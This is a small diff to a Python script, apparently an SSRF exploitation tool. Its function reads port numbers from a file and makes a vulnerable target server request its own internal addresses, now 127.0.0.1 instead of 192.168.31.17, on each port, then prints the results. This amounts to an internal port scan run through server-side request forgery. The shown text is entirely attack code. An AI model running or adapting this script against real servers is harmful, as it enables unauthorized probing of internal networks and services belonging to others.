@@ -5,7 +5,7 @@ import requests
 def ssrf_http(url,dir):
     with open(dir,'r')as port:
         for i in port:
-            path ='=http://192.168.31.17:%s'%i.strip()
+            path ='=http://127.0.0.1:%s'%i.strip()
             r = requests.get(url=url+path)
             print('-------------------')
             print('port'+':'+i)
